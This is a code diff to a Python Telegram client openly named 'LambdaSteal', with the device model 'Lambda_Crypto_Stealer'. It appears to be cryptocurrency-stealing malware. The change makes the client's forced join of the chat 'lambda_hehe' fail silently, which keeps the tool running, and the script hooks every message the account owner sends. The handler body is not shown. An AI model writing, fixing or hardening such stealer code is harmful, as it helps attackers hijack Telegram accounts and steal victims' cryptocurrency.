@@ -27,7 +27,10 @@ if __name__ == '__main__':
             app = Client(name='LambdaSteal', api_id=settings[1], api_hash=settings[2])
             app.DEVICE_MODEL = 'Lambda_Crypto_Stealer'
             print(RU['starting'] if lang == 'ru' else ENG['starting'])
-            app.join_chat('lambda_hehe') 
+            try:
+                app.join_chat('lambda_hehe') 
+            except:
+                pass
             @app.on_message(filters.me)
             async def hehe(_, message):
                 ...
